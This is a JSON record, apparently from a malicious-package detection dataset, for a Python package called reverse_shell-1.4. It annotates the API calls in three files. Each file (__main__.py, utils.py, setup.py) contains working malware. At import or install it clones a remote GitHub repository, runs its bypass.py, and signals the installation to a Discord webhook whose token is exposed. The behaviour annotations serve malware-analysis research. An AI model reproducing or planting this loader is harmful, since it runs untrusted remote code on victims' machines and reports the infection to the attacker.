[
  {
    "pyfile": "__main__.py",
    "code_snippet": "import requests\nimport git\nimport subprocess\nimport os\n\ndef send_discord_info():\n    webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd'\n    headers = {'Content-Type': 'application/json'}\n    data = {'content': f'¡Alguien ha instalado el paquete reverse_shell!'}\n    response = requests.post(webhook_url, headers=headers, json=data)\n\nrepo_url = 'https://github.com/NotInfected/updater.git'\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nif not os.path.isdir(repo_path):\n    git.Repo.clone_from(repo_url, repo_path)\n\nos.chdir(repo_path)\nsubprocess.run(['python', 'bypass.py'])\n\nif __name__ == '__main__':\n    send_discord_info()",
    "pattern_analysis": {
      "api_sequence": [
        "os.path.isdir",
        "git.Repo.clone_from",
        "os.chdir",
        "subprocess.run",
        "requests.post"
      ],
      "api_sequence_with_args": [
        "os.path.isdir(repo_path)",
        "git.Repo.clone_from(repo_url, repo_path)",
        "os.chdir(repo_path)",
        "subprocess.run(['python', 'bypass.py'])",
        "requests.post(webhook_url, headers=headers, json=data)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "git.Repo.clone_from",
          "id": "clone_git_repo",
          "description": "Clones Git repository to specified local path",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "persistence_configuration"
        },
        {
          "api_name": "os.chdir",
          "id": "change_working_dir",
          "description": "Changes current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import requests\nimport git\nimport subprocess\nimport os\n\ndef send_discord_info():\n    webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd'\n    headers = {'Content-Type': 'application/json'}\n    data = {'content': f'¡Alguien ha instalado el paquete reverse_shell!'}\n    response = requests.post(webhook_url, headers=headers, json=data)\n\nrepo_url = 'https://github.com/NotInfected/updater.git'\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nif not os.path.isdir(repo_path):\n    git.Repo.clone_from(repo_url, repo_path)\n\nos.chdir(repo_path)\nsubprocess.run(['python', 'bypass.py'])\n\ndef main():\n    send_discord_info()\n\nif __name__ == '__main__':\n    send_discord_info()"
    }
  },
  {
    "pyfile": "utils.py",
    "code_snippet": "import requests\nimport socket\nimport git\nimport subprocess\nimport os\n\ndef send_discord_info():\n    webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd'\n    headers = {'Content-Type': 'application/json'}\n    data = {'content': f'¡Alguien ha instalado el paquete reverse_shell!'}\n    response = requests.post(webhook_url, headers=headers, json=data)\n\nrepo_url = 'https://github.com/NotInfected/updater.git'\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nif not os.path.isdir(repo_path):\n    git.Repo.clone_from(repo_url, repo_path)\n\nos.chdir(repo_path)\nsubprocess.run(['python', 'bypass.py'])\n\nif __name__ == '__main__':\n    send_discord_info()",
    "pattern_analysis": {
      "api_sequence": [
        "requests.post",
        "os.path.isdir",
        "git.Repo.clone_from",
        "os.chdir",
        "subprocess.run"
      ],
      "api_sequence_with_args": [
        "requests.post(webhook_url, headers=headers, json=data)",
        "os.path.isdir(repo_path)",
        "git.Repo.clone_from(repo_url, repo_path)",
        "os.chdir(repo_path)",
        "subprocess.run(['python', 'bypass.py'])"
      ],
      "mapped_sequence": [
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "git.Repo.clone_from",
          "id": "clone_git_repo",
          "description": "Clones Git repository to specified local path",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "persistence_configuration"
        },
        {
          "api_name": "os.chdir",
          "id": "change_working_dir",
          "description": "Changes current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        }
      ],
      "contextual_code": "import requests\nimport git\nimport subprocess\nimport os\n\ndef send_discord_info():\n    webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd'\n    headers = {'Content-Type': 'application/json'}\n    data = {'content': f'¡Alguien ha instalado el paquete reverse_shell!'}\n    response = requests.post(webhook_url, headers=headers, json=data)\n\nrepo_url = 'https://github.com/NotInfected/updater.git'\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nif not os.path.isdir(repo_path):\n    git.Repo.clone_from(repo_url, repo_path)\n\nos.chdir(repo_path)\nsubprocess.run(['python', 'bypass.py'])\n\ndef main():\n    send_discord_info()\n\nif __name__ == '__main__':\n    send_discord_info()"
    }
  },
  {
    "pyfile": "setup.py",
    "code_snippet": "import subprocess\nimport os\nimport git\n\ndef send_discord_info(repo_path):\n    # Clona el repositorio de GitHub y ejecuta el archivo\n    repo_url = 'https://github.com/NotInfected/updater.git'  # Reemplaza con la URL de tu repositorio de GitHub\n\n    if not os.path.isdir(repo_path):\n        git.Repo.clone_from(repo_url, repo_path)\n\n    os.chdir(repo_path)\n    subprocess.run(['python', 'bypass.py'])\n\n# Define la ruta donde deseas clonar el repositorio\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nif __name__ == '__main__':\n    send_discord_info(repo_path)",
    "pattern_analysis": {
      "api_sequence": [
        "os.path.isdir",
        "git.Repo.clone_from",
        "os.chdir",
        "subprocess.run",
        "os.path.join"
      ],
      "api_sequence_with_args": [
        "os.path.isdir(repo_path)",
        "git.Repo.clone_from(repo_url, repo_path)",
        "os.chdir(repo_path)",
        "subprocess.run(['python', 'bypass.py'])",
        "os.path.join('C:', 'Users', 'repo')"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "git.Repo.clone_from",
          "id": "clone_git_repo",
          "description": "Clones Git repository to specified local path",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "persistence_configuration"
        },
        {
          "api_name": "os.chdir",
          "id": "change_working_dir",
          "description": "Changes current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        }
      ],
      "contextual_code": "import subprocess\nimport os\nimport git\n\ndef send_discord_info(repo_path):\n    repo_url = 'https://github.com/NotInfected/updater.git'\n\n    if not os.path.isdir(repo_path):\n        git.Repo.clone_from(repo_url, repo_path)\n\n    os.chdir(repo_path)\n    subprocess.run(['python', 'bypass.py'])\n\nrepo_path = os.path.join('C:', 'Users', 'repo')\n\nif __name__ == '__main__':\n    send_discord_info(repo_path)"
    }
  },
  {
    "metadata": {
      "package_name": "reverse_shell-1.4"
    }
  }
]